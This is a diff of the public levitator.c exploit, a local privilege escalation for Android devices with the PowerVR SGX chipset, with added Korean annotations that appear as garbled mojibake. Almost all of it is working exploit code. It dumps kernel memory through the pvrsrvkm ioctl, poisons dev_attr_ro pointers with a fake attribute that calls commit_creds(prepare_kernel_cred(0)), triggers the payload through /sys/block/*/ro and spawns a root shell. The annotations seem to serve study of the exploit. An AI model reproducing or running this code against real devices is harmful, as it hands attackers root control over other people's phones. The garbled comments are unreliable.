@@ -1,10 +1,10 @@
 // https://jon.oberheide.org/files/levitator.c
-// ÃÊ±â ºĞ¼®ÀÌ ¸¶¹«¸® µÇ¾ú½À´Ï´Ù.
-// ¸ŞÀÎ ÇÔ¼ö¸¦ ÅëÇØ¼­ ºĞ¼®À» ÇØ º¸¾Ò´Âµ¥¿ä, ¸Ş¸ğ¸® Å¬·Î¹ö¸µÀ» ÅëÇÑ ÀåÄ¡ °¨¿°°ú Æ®¸®°Å µğ¹ÙÀÌ½º°¡ ´Ù¸¥ Â÷ÀÌ°¡ ÀÖ¾î ¾à°£ °ø°İÀÌ
-// ¾î·Á¿î ÇÔ¼öÀÇ ¹öÀüÀÌ¾ú½À´Ï´Ù. PowerVR SGX Ä¨¼ÂÀÌ ¸¹ÀÌ ¾²ÀÌÁö ¾ÊÀ» °Å¶ó¼­ ¸®½ºÅ©°¡ Å©Áö´Â ¾ÊÁö¸¸, Å×½ºÆ®·Î ÇÊ¿äÇÑ ÀÍ½ºÇÃ·ÎÀÕ ÄÚµåÀÎ°Å °°³×¿ä.
-// 2Â÷ ºĞ¼®Àº ¼¼ºÎ ÇÔ¼ö¸¦ ºĞ¼®ÇØ º¸°í 3Â÷·Î ¸®Æ÷Æ®¸¦ ¾²°í ¸¶¹«¸®ÇÏ°íÀÚ ÇÕ´Ï´Ù.
-// 2Â÷ ºĞ¼®: ¼¼ºÎ ºĞ¼®
-// 3Â÷ ºĞ¼®: ¸®Æ÷Æ® ¾²±â.
+// ì´ˆê¸° ë¶„ì„ì´ ë§ˆë¬´ë¦¬ ë˜ì—ˆìŠµë‹ˆë‹¤.
+// ë©”ì¸ í•¨ìˆ˜ë¥¼ í†µí•´ì„œ ë¶„ì„ì„ í•´ ë³´ì•˜ëŠ”ë°ìš”, ë©”ëª¨ë¦¬ í´ë¡œë²„ë§ì„ í†µí•œ ì¥ì¹˜ ê°ì—¼ê³¼ íŠ¸ë¦¬ê±° ë””ë°”ì´ìŠ¤ê°€ ë‹¤ë¥¸ ì°¨ì´ê°€ ìˆì–´ ì•½ê°„ ê³µê²©ì´
+// ì–´ë ¤ìš´ í•¨ìˆ˜ì˜ ë²„ì „ì´ì—ˆìŠµë‹ˆë‹¤. PowerVR SGX ì¹©ì…‹ì´ ë§ì´ ì“°ì´ì§€ ì•Šì„ ê±°ë¼ì„œ ë¦¬ìŠ¤í¬ê°€ í¬ì§€ëŠ” ì•Šì§€ë§Œ, í…ŒìŠ¤íŠ¸ë¡œ í•„ìš”í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì¸ê±° ê°™ë„¤ìš”.
+// 2ì°¨ ë¶„ì„ì€ ì„¸ë¶€ í•¨ìˆ˜ë¥¼ ë¶„ì„í•´ ë³´ê³  3ì°¨ë¡œ ë¦¬í¬íŠ¸ë¥¼ ì“°ê³  ë§ˆë¬´ë¦¬í•˜ê³ ì í•©ë‹ˆë‹¤.
+// 2ì°¨ ë¶„ì„: ì„¸ë¶€ ë¶„ì„
+// 3ì°¨ ë¶„ì„: ë¦¬í¬íŠ¸ ì“°ê¸°.
 
 /*
  * levitator.c
@@ -42,15 +42,15 @@
  *   [+] resolved symbol commit_creds to 0xc00770dc
  *   [+] resolved symbol prepare_kernel_cred to 0xc0076f64
  *   [+] resolved symbol dev_attr_ro to 0xc05a5834
- *   [+] opening prvsrvkm device... // prvsrvkm µğ¹ÙÀÌ½º¸£¸¦ ¿ÀÇÂ.
- *   [+] dumping kernel memory... // Ä¿³Î ¸Ş¸ğ¸®¸¦ ´ıÇÁ.
- *   [+] searching kmem for dev_attr_ro pointers... // kmem¿¡¼­ dev_attr_ro Æ÷ÀÎÅÍµéÀ» °Ë»ö.
- *   [+] poisoned 16 dev_attr_ro pointers with fake_dev_attr_ro! // 16°³ÀÇ dev_attr_ro Æ÷ÀÎÅÍ¸¦ fake_dev_attr_ro·Î °¨¿°.
- *   [+] clobbering kmem with poisoned pointers... // kmemÀ» °¨¿°µÈ Æ÷ÀÎÅÍ·Î Å¬·Î¹ö¸µ. (½ÇÇà)
- *   [+] triggering privesc via block ro sysfs attribute... // sysfs ¼Ó¼ºÀÇ block ro¸¦ ÅëÇØ privesc Æ®¸®°Å¸µ!
- *   [+] restoring original dev_attr_ro pointers... // ¿øº» dev_attr_ro Æ÷ÀÎÅÍ º¹±¸.
- *   [+] restored 16 dev_attr_ro pointers! // 16°³ÀÇ dev_attr_ro Æ÷ÀÎÅÍ º¹±¸.
- *   [+] privileges escalated, enjoy your shell! // ±ÇÇÑ »ó½ÂµÇ¾ú½À´Ï´Ù, ½© ½ÇÇà (·çÆ®½© È¹µæ ¼º°ø!).
+ *   [+] opening prvsrvkm device... // prvsrvkm ë””ë°”ì´ìŠ¤ë¥´ë¥¼ ì˜¤í”ˆ.
+ *   [+] dumping kernel memory... // ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„.
+ *   [+] searching kmem for dev_attr_ro pointers... // kmemì—ì„œ dev_attr_ro í¬ì¸í„°ë“¤ì„ ê²€ìƒ‰.
+ *   [+] poisoned 16 dev_attr_ro pointers with fake_dev_attr_ro! // 16ê°œì˜ dev_attr_ro í¬ì¸í„°ë¥¼ fake_dev_attr_roë¡œ ê°ì—¼.
+ *   [+] clobbering kmem with poisoned pointers... // kmemì„ ê°ì—¼ëœ í¬ì¸í„°ë¡œ í´ë¡œë²„ë§. (ì‹¤í–‰)
+ *   [+] triggering privesc via block ro sysfs attribute... // sysfs ì†ì„±ì˜ block roë¥¼ í†µí•´ privesc íŠ¸ë¦¬ê±°ë§!
+ *   [+] restoring original dev_attr_ro pointers... // ì›ë³¸ dev_attr_ro í¬ì¸í„° ë³µêµ¬.
+ *   [+] restored 16 dev_attr_ro pointers! // 16ê°œì˜ dev_attr_ro í¬ì¸í„° ë³µêµ¬.
+ *   [+] privileges escalated, enjoy your shell! // ê¶Œí•œ ìƒìŠ¹ë˜ì—ˆìŠµë‹ˆë‹¤, ì‰˜ ì‹¤í–‰ (ë£¨íŠ¸ì‰˜ íšë“ ì„±ê³µ!).
  *   # id
  *   uid=0(root) gid=0(root)
  *
@@ -59,8 +59,8 @@
  *     The vulnerability affects Android devices with the PowerVR SGX chipset
  *     which includes popular models like the Nexus S and Galaxy S series. The 
  *     vulnerability was patched in the Android 2.3.6 OTA update.
- *     ÀÌ Ãë¾àÁ¡Àº PowerVR SGX Ä¨¼ÂÀÇ ¾Èµå·ÎÀÌµå ÀåÄ¡¿¡ Ãë¾àÇß°í Nexsus S³ª °¶·°½Ã S ½Ã¸®Áî¿¡ Å¾ÀçµÈ °ÍÀÌ¾ú½À´Ï´Ù.
- *     ¾Èµå·ÎÀÌµå 2.3.6 OTA ¾÷µ¥ÀÌÆ®¿¡ ÆĞÄ¡µÇ¾ú´Ù.
+ *     ì´ ì·¨ì•½ì ì€ PowerVR SGX ì¹©ì…‹ì˜ ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ì— ì·¨ì•½í–ˆê³  Nexsus Së‚˜ ê°¤ëŸ­ì‹œ S ì‹œë¦¬ì¦ˆì— íƒ‘ì¬ëœ ê²ƒì´ì—ˆìŠµë‹ˆë‹¤.
+ *     ì•ˆë“œë¡œì´ë“œ 2.3.6 OTA ì—…ë°ì´íŠ¸ì— íŒ¨ì¹˜ë˜ì—ˆë‹¤.
  */
 
 #include <stdio.h>
@@ -75,9 +75,12 @@
 #include <sys/types.h>
 #include <sys/ioctl.h>
 
+// CONNECT_SERVICES ì‹ë³„ ì•„ì´ë””:(ioctl ì½”ë“œ ë²ˆí˜¸)
 #define CONNECT_SERVICES 0xc01c670c
+// ë©”ëª¨ë¦¬ ë¤í”„í•  ì‚¬ì´ì¦ˆ. (161920 ë°”ì´íŠ¸)
 #define DUMP_SIZE        161920
 
+// PVRSSRV_BRIDGE_PACKAGE êµ¬ì¡°.
 typedef struct {
 	uint32_t ui32BridgeID;
 	uint32_t ui32Size;
@@ -88,30 +91,36 @@ typedef struct {
 	void * hKernelServices;
 } PVRSRV_BRIDGE_PACKAGE;
 
+
+// í¬ë¦¬ë´ì…œ ê°±ì‹  í•¨ìˆ˜ êµ¬ì¡° ì„ ì–¸.
 typedef int (* _commit_creds)(unsigned long cred);
 typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
 _commit_creds commit_creds;
 _prepare_kernel_cred prepare_kernel_cred;
 
+// fake_disk_ro_show() í›„í‚¹ í•¨ìˆ˜.
 ssize_t
 fake_disk_ro_show(void *dev, void *attr, char *buf)
 {
-	commit_creds(prepare_kernel_cred(0));
+	commit_creds(prepare_kernel_cred(0)); // í¬ë¦¬ë´ì…œ ê°±ì‹ .
 	return sprintf(buf, "0wned\n");
 }
 
+// attribute êµ¬ì¡°.
 struct attribute {
 	const char *name;
 	void *owner;
 	mode_t mode;
 };
 
+// device_attribute êµ¬ì¡°.
 struct device_attribute {
 	struct attribute attr;
-	ssize_t (*show)(void *dev, void *attr, char *buf);
+	ssize_t (*show)(void *dev, void *attr, char *buf); // device_attriute.show = í›„í‚¹ fake í•¨ìˆ˜ë¡œ ì“°ì„.
 	ssize_t (*store)(void *dev, void *attr, const char *buf, size_t count);
 };
 
+// fake_dev_attr_ro êµ¬ì¡° ë³€ìˆ˜.
 struct device_attribute fake_dev_attr_ro = {
 	.attr	= {
 		.name = "ro",
@@ -121,6 +130,7 @@ struct device_attribute fake_dev_attr_ro = {
 	.store = NULL,
 };
 
+// ì‹¬ë³¼ ì–»ëŠ” í•¨ìˆ˜.
 unsigned long
 get_symbol(char *name)
 {
@@ -128,7 +138,8 @@ get_symbol(char *name)
 	unsigned long addr;
 	char dummy, sname[512];
 	int ret = 0;
- 
+
+	// /proc/kallsyms ì ‘ê·¼ì„ í†µí•´ì„œ ë¬¸ìì—´ ê²€ìƒ‰ìœ¼ë¡œ ì‹¬ë³¼ ì£¼ì†Œ êµ¬í•¨. 
 	f = fopen("/proc/kallsyms", "r");
 	if (!f) {
 		return 0;
@@ -149,8 +160,8 @@ get_symbol(char *name)
 	return 0;
 }
 
-int
-do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
+// ioctl ì„ ìˆ˜í–‰í•˜ì—¬ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ì½ê³  ì“°ëŠ” í•¨ìˆ˜.
+int do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
 {
 	PVRSRV_BRIDGE_PACKAGE pkg;
 
@@ -163,10 +174,11 @@ do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_siz
 	pkg.ui32OutBufferSize = out_size;
 	pkg.pvParamOut = out;
 
+	// íŒ¨í‚¤ì§€ êµ¬ì¡°ë¥¼ ì¸ìë¡œ ioctl.
 	return ioctl(fd, 0, &pkg);
 }
 
-// ¸ŞÀÎ ¿£Æ®¸® ÇÔ¼ö ±â´É:
+// ë©”ì¸ ì—”íŠ¸ë¦¬ í•¨ìˆ˜ ê¸°ëŠ¥:
 int main(int argc, char **argv)
 {
 	DIR *dir;
@@ -177,21 +189,21 @@ int main(int argc, char **argv)
 
 	printf("[+] looking for symbols...\n");
 
-        // commit_creds ±¸ÇÔ.
+        // commit_creds êµ¬í•¨.
 	commit_creds = (_commit_creds) get_symbol("commit_creds");
 	if (!commit_creds) {
 		printf("[-] commit_creds symbol not found, aborting!\n");
 		exit(1);
 	}
 
-        // prepare_kernel_cred ±¸ÇÔ.
+        // prepare_kernel_cred êµ¬í•¨.
 	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
 	if (!prepare_kernel_cred) {
 		printf("[-] prepare_kernel_cred symbol not found, aborting!\n");
 		exit(1);
 	}
 
-        // dev_attr_ro ±¸ÇÔ.
+        // dev_attr_ro êµ¬í•¨.
 	dev_attr_ro = get_symbol("dev_attr_ro");
 	if (!dev_attr_ro) {
 		printf("[-] dev_attr_ro symbol not found, aborting!\n");
@@ -200,7 +212,7 @@ int main(int argc, char **argv)
 
 	printf("[+] opening prvsrvkm device...\n");
 
-        // Ãë¾à µğ¹ÙÀÌ½º(/dev/pvrsvkm)À» ÀĞ±â ¾²±â Àü¿ëÀ¸·Î ¿ÀÇÂ.
+        // ì·¨ì•½ ë””ë°”ì´ìŠ¤(/dev/pvrsvkm)ì„ ì½ê¸° ì“°ê¸° ì „ìš©ìœ¼ë¡œ ì˜¤í”ˆ.
 	fd = open("/dev/pvrsrvkm", O_RDWR);
 	if (fd == -1) {
 		printf("[-] failed opening pvrsrvkm device, aborting!\n");
@@ -209,12 +221,12 @@ int main(int argc, char **argv)
 
 	printf("[+] dumping kernel memory...\n");
 
-        // ¸Ş¸ğ¸® ´ıÇÁ.
+        // ë©”ëª¨ë¦¬ ë¤í”„.
 	dump = malloc(DUMP_SIZE + 0x1000);
 	dump_end = dump + DUMP_SIZE + 0x1000;
 	memset(dump, 0, DUMP_SIZE + 0x1000);
 
-        // ´ıÇÎ. (DUMP_SIZE - 1000)¸¸Å­ ´ıÇÎ.
+        // ë¤í•‘. (DUMP_SIZE - 1000)ë§Œí¼ ë¤í•‘.
 	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
 	if (ret == -1) {
 		printf("[-] failed during ioctl, aborting!\n");
@@ -224,7 +236,7 @@ int main(int argc, char **argv)
 	printf("[+] searching kmem for dev_attr_ro pointers...\n");
 
 	found = 0;
-        // Ä¿³Î ¸Ş¸ğ¸®¿¡¼­ dev_attr_ro ÁÖ¼Ò¸¦ Ã£¾Æ¼­ Ä¿³Î ¸Ş¸ğ¸® »óÀÇ Æ÷ÀÎÅÍ¸¦ fake_dev_attr_ro·Î °¨¿°.
+        // ì»¤ë„ ë©”ëª¨ë¦¬ì—ì„œ dev_attr_ro ì£¼ì†Œë¥¼ ì°¾ì•„ì„œ ì»¤ë„ ë©”ëª¨ë¦¬ ìƒì˜ í¬ì¸í„°ë¥¼ fake_dev_attr_roë¡œ ê°ì—¼.
 	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
 		if (*ptr == dev_attr_ro) {
 			*ptr = (unsigned long) &fake_dev_attr_ro;
@@ -241,7 +253,7 @@ int main(int argc, char **argv)
 
 	printf("[+] clobbering kmem with poisoned pointers...\n");
 
-        // ioctl µÎ ¹øÂ° ÀÎÀÚ¿¡ dump¸¦ ³Ö¾î¼­ Å¬·Î¹ö¸µ(¼öÁ¤µÈ ÆäÀÌÁö)¸¦ ¸Ş¸ğ¸®¿¡ Àû¿ë.
+        // ioctl ë‘ ë²ˆì§¸ ì¸ìì— dumpë¥¼ ë„£ì–´ì„œ í´ë¡œë²„ë§(ìˆ˜ì •ëœ í˜ì´ì§€)ë¥¼ ë©”ëª¨ë¦¬ì— ì ìš©.
 	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
 	if (ret == -1) {
 		printf("[-] failed during ioctl, aborting!\n");
@@ -250,7 +262,7 @@ int main(int argc, char **argv)
 
 	printf("[+] triggering privesc via block ro sysfs attribute...\n");
 
-        // dir = /sys/block µğ·ºÅä¸® ¿ÀÇÂ.
+        // dir = /sys/block ë””ë ‰í† ë¦¬ ì˜¤í”ˆ.
 	dir = opendir("/sys/block");
 	if (!dir) {
 		printf("[-] failed opening /sys/block, aborting!\n");
@@ -265,7 +277,7 @@ int main(int argc, char **argv)
 
 		snprintf(path, sizeof(path), "/sys/block/%s/ro", dentry->d_name);
 
-                // /syys/block/[ÀåÄ¡¸í]/ro ¸¦ ¿ÀÇÂÇØ¼­ Ãë¾àÁ¡ Æ®¸®°Å! (¿ÀÇÂÇÏ´Â °ÍÀ¸·Î Ãë¾àÁ¡ÀÌ Æ®¸®°ÅµÊ!)
+                // /syys/block/[ì¥ì¹˜ëª…]/ro ë¥¼ ì˜¤í”ˆí•´ì„œ ì·¨ì•½ì  íŠ¸ë¦¬ê±°! (ì˜¤í”ˆí•˜ëŠ” ê²ƒìœ¼ë¡œ ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±°ë¨!)
 		trigger = open(path, O_RDONLY);
 		if (trigger == -1) {
 			printf("[-] failed opening ro sysfs attribute, aborting!\n");
@@ -288,7 +300,7 @@ int main(int argc, char **argv)
 	}
 
 	printf("[+] restoring original dev_attr_ro pointers...\n");
-        // µÎ ¹øÂ° ÀÎÀÚ¿¡ NULLÀ» ³Ö¾î¼­ ¿øº» Æ÷ÀÎÅÍ·Î º¹¿ø ÁØºñ.
+        // ë‘ ë²ˆì§¸ ì¸ìì— NULLì„ ë„£ì–´ì„œ ì›ë³¸ í¬ì¸í„°ë¡œ ë³µì› ì¤€ë¹„.
 	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
 	if (ret == -1) {
 		printf("[-] failed during ioctl, aborting!\n");
@@ -310,14 +322,14 @@ int main(int argc, char **argv)
 		exit(1);
 	}
 
-	// dump·Î ²¨³½ ¿øº» ¸Ş¸ğ¸®¸¦ ioctl·Î ¾²±âÇØ¼­ º¹¿ø.
+	// dumpë¡œ êº¼ë‚¸ ì›ë³¸ ë©”ëª¨ë¦¬ë¥¼ ioctlë¡œ ì“°ê¸°í•´ì„œ ë³µì›.
 	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
 	if (ret == -1) {
 		printf("[-] failed during ioctl, aborting!\n");
 		exit(1);
 	}
 
-        // getuid()·Î uid°¡ 0À¸·Î »ó½ÂÇß´ÂÁö È®ÀÎ.
+        // getuid()ë¡œ uidê°€ 0ìœ¼ë¡œ ìƒìŠ¹í–ˆëŠ”ì§€ í™•ì¸.
 	if (getuid() != 0) {
 		printf("[-] privileges not escalated, exploit failed!\n");
 		exit(1);
@@ -325,7 +337,7 @@ int main(int argc, char **argv)
 
 	printf("[+] privileges escalated, enjoy your shell!\n");
 
-        // »ó½ÂÇÑ °æ¿ì ·çÆ®½© ½ÇÇà.
+        // ìƒìŠ¹í•œ ê²½ìš° ë£¨íŠ¸ì‰˜ ì‹¤í–‰.
 	execl("/system/bin/sh", "sh", NULL);
 
 	return 0;
